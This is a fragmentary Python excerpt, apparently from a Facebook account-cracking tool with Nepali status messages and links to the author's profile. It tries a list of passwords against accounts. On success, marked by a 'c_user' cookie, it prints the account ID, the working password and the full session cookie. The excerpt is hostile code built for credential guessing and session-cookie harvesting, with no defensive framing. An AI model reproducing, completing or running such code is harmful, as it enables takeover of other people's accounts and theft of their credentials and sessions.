...
cps = []
try:
    print('\n\033[1;37m[•] WAIT LADO TANKIDAI XA')
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/M1k3yyyy')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[M1K3Y-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[M1K3Y-CP] '+uid+' | '+ps+'\x1b[1;97m')
